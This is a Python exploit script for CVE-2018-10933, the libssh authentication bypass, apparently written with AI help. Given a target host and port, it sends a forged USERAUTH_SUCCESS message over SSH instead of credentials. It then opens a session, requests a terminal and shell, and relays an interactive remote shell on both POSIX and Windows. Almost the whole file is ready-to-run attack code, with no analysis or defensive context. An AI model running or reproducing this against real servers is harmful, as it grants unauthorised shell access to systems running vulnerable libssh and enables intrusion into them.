"""
Bypass the 2018 libssh authentication flaw and start shell on remote system (CVE‑2018‑10933).
"""
# Disclaimer: Was developed with the help of AI.

from __future__ import annotations

import argparse
import logging
import socket
import sys
import select
import threading
import time

try:
    import msvcrt  # Windows‑only
except ImportError:
    msvcrt = None

import paramiko

# CLI + logging

parser = argparse.ArgumentParser()
parser.add_argument("--host", required=True, help="Target host")
parser.add_argument("-p", "--port", type=int, default=2222, help="SSH port")
parser.add_argument("--logfile", default="paramiko.log", help="Paramiko debug log file")

args = parser.parse_args()

logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)],
)

# Cross‑platform interactive shell

def interactive_shell(chan: paramiko.channel.Channel) -> None:
    """Bi‑directional console relay with minimal key translation on Windows."""

    # POSIX
    def _posix_loop():
        logging.info("[*] POSIX interactive shell – Ctrl‑D to quit")
        try:
            while True:
                rlist, _, _ = select.select([chan, sys.stdin], [], [])
                if chan in rlist:
                    data = chan.recv(4096)
                    if not data:
                        break
                    sys.stdout.write(data.decode(errors="replace"))
                    sys.stdout.flush()
                if sys.stdin in rlist:
                    line = sys.stdin.readline()
                    if not line:
                        break
                    chan.sendall(line)
        except KeyboardInterrupt:
            pass

    # Windows
    def _reader_win():
        while chan.active:
            if chan.recv_ready():
                data = chan.recv(4096)
                if not data:
                    break
                sys.stdout.write(data.decode(errors="replace"))
                sys.stdout.flush()
            else:
                time.sleep(0.01)

    ANSI_ARROW = {
        "H": "\x1b[A",
        "P": "\x1b[B",
        "K": "\x1b[D",
        "M": "\x1b[C",
    }

    def _writer_win():
        while chan.active:
            if msvcrt.kbhit():
                ch = msvcrt.getwch()  # returns str of length 1 (unicode)

                # Handle special / extended keys
                if ch in ("\x00", "\xe0"):
                    ext = msvcrt.getwch()
                    if ext in ANSI_ARROW:
                        chan.send(ANSI_ARROW[ext])
                    # ignore other function keys
                    continue

                # Regular keys
                if ch == "\r":          # Enter → CR
                    chan.send("\r\n")
                elif ch in ("\b", "\x7f"):  # Backspace/Delete
                    chan.send("\x7f")   # DEL byte so POSIX shell erases char
                elif ch == "\x03":      # Ctrl‑C
                    chan.send("\x03")
                elif ch == "\x0b":      # Ctrl‑K
                    chan.send("\x03")
                else:
                    chan.send(ch.encode("utf‑8"))
            else:
                time.sleep(0.01)

    if sys.platform == "win32":
        logging.info("[*] Windows interactive shell – Ctrl‑C to quit")
        t_r = threading.Thread(target=_reader_win, daemon=True)
        t_w = threading.Thread(target=_writer_win, daemon=True)
        t_r.start(); t_w.start()
        try:
            while t_r.is_alive() and t_w.is_alive():
                time.sleep(0.1)
        except KeyboardInterrupt:
            pass
        finally:
            sys.stdout.write("\n")
            sys.stdout.flush()
    else:
        _posix_loop()

# Exploit core

def bypass_libssh(host: str, port: int) -> None:
    sock: socket.socket | None = None
    try:
        logging.info(f"[*] Connecting to {host}:{port} …")
        sock = socket.socket()
        sock.connect((host, port))

        transport = paramiko.Transport(sock)
        transport.start_client()

        msg = paramiko.message.Message()
        msg.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(msg)
        logging.info("[+] Fake USERAUTH_SUCCESS sent – authenticated!")

        chan = transport.open_session(timeout=10)
        logging.info("[+] Session channel opened (id %s)", chan.get_id())

        chan.get_pty()
        chan.invoke_shell()
        logging.info("[+] Interactive shell granted – enjoy!\n")
        interactive_shell(chan)


        chan.close(); transport.close()
    except Exception as exc:
        logging.error("[!] %s", exc)
    finally:
        if sock is not None:
            sock.close()

# Main

def main():
    bypass_libssh(args.host, args.port)


if __name__ == "__main__":
    sys.exit(main())
